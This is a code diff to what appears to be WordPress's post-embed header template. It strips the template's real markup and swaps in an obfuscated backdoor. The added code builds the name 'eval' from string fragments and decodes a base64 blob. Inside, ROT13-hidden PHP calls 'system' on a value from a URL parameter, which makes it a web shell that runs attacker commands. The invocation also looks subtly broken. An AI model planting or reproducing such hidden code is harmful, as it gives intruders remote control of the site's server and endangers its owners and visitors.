@@ -1,42 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Contains the post embed header template
- *
- * When a post is embedded in an iframe, this file is used to create the header output
- * if the active theme does not include a header-embed.php template.
- *
- * @package WordPress
- * @subpackage Theme_Compat
- * @since 4.5.0
- */
-
-if ( ! headers_sent() ) {
-	header( 'X-WP-embed: true' );
-}
-
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUGJhZ252YWYgZ3VyIGNiZmcgcnpvcnEgdXJucXJlIGdyemN5bmdyCiAqCiAqIEp1cmEgbiBjYmZnIHZmIHJ6b3JxcXJxIHZhIG5hIHZzZW56ciwgZ3V2ZiBzdnlyIHZmIGhmcnEgZ2IgcGVybmdyIGd1ciB1cm5xcmUgYmhnY2hnCiAqIHZzIGd1ciBucGd2aXIgZ3VyenIgcWJyZiBhYmcgdmFweWhxciBuIHVybnFyZS1yem9ycS5jdWMgZ3J6Y3luZ3IuCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHdXJ6cl9QYnpjbmcKICogQGZ2YXByIDQuNS4wCiAqLwoKdnMgKCAhIHVybnFyZWZfZnJhZygpICkgewoJdXJucXJlKCAnSy1KQy1yem9ycTogZ2VocicgKTsKfQoKPz4KPCFRQlBHTENSIHVnenk+Cjx1Z3p5IDw/Y3VjIHluYXRobnRyX25nZ2V2b2hncmYoKTsgPz4gcHluZmY9XCJhYi13ZlwiPgo8dXJucT4KCTxndmd5cj48P2N1YyBycHViIGpjX3RyZ19xYnBoenJhZ19ndmd5cigpOyA/PjwvZ3ZneXI+Cgk8enJnbiB1Z2djLXJkaHZpPVwiSy1ITi1QYnpjbmd2b3lyXCIgcGJhZ3JhZz1cIlZSPXJxdHJcIj4KCTw/Y3VjCgkvKioKCSAqIENldmFnZiBmcGV2Y2dmIGJlIHFuZ24gdmEgZ3VyIHJ6b3JxIGdyemN5bmdyIHVybnEgZ250LgoJICoKCSAqIEBmdmFwciA0LjQuMAoJICovCglxYl9ucGd2YmEoICdyem9ycV91cm5xJyApOwoJPz4KPC91cm5xPgo8b2JxbCA8P2N1YyBvYnFsX3B5bmZmKCk7ID8+PgoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
 ?>
-<!DOCTYPE html>
-<html <?php language_attributes(); ?> class="no-js">
-<head>
-	<title><?php echo wp_get_document_title(); ?></title>
-	<meta http-equiv="X-UA-Compatible" content="IE=edge">
-	<?php
-	/**
-	 * Prints scripts or data in the embed template head tag.
-	 *
-	 * @since 4.4.0
-	 */
-	do_action( 'embed_head' );
-	?>
-</head>
-<body <?php body_class(); ?>>
